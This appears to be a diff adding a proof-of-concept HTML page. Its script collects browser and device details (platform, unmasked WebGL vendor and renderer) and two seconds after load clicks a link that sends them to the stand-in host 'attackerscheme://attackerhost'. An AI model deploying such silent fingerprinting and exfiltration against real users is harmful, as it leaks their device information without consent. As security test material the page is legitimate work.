@@ -1,0 +1,75 @@
+<html>
+<body>
+  <a href="" id="OS"> OS </a>
+  <canvas id="glcanvas" width="0" height="0"></canvas>
+  <script>
+
+    if(navigator.onLine){
+      //alert('online');
+     } else {
+      //alert('offline');
+     }
+
+    function manufacturerInfo(){
+      var manufacturer = '';
+      if (/android/i.test(navigator.userAgent)) {
+        manufacturer = navigator.userAgent.match(/; ([^;]+);/)[1];
+      } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
+        manufacturer = 'Apple';
+      } else if (/windows phone/i.test(navigator.userAgent)) {
+        manufacturer = 'Microsoft';
+      } else if (/windows/i.test(navigator.userAgent)) {
+        manufacturer = 'PC';
+      } else if (/macintosh|mac os x/i.test(navigator.userAgent)) {
+        manufacturer = 'Apple';
+      }
+
+      return manufacturer;
+    }
+
+
+    //var manufacturerName = manufacturerInfo();
+
+    var performance = window.performance || window.mozPerformance || window.msPerformance || window.webkitPerformance || {};
+    console.log(performance);
+    var platform = navigator.platform + "$$";
+    var product = navigator.OS + "$$";
+
+    //alert(product);
+    var securityPolicy = navigator.securityPolicy + "$$";
+    var canvas;
+    canvas = document.getElementById("glcanvas");
+    var gl = canvas.getContext("experimental-webgl");
+    var vendor = getUnmaskedInfo(gl).vendor + "$$" ;
+    var renderer = getUnmaskedInfo(gl).renderer   ;
+    function getUnmaskedInfo(gl) {
+      var unMaskedInfo = {
+        renderer: '',
+        vendor: ''
+      };
+
+      var dbgRenderInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbgRenderInfo != null) {
+        unMaskedInfo.renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
+        unMaskedInfo.vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
+      }
+      return unMaskedInfo;
+    }
+    var a = document.getElementById('OS'); //or grab it by tagname etc
+    a.href = "attackerscheme://attackerhost/?osInfo=" + platform  + product + securityPolicy + vendor +  renderer ;
+    //alert(a);
+    //alert(navigator.appName+' ## ' +navigator.appCodeName+ ' ## '+navigator.appVersion);
+
+    /*setTimeout(() => {
+        console.log("Delayed for 1 second.");
+    }, "10000");*/
+
+    setTimeout(() => {
+       document.getElementById("OS").click();
+    }, "2000");
+
+    
+    //alert("osInfo=" + platform  + product + securityPolicy + vendor +  renderer);
+  </script>
+</body>
+</html>
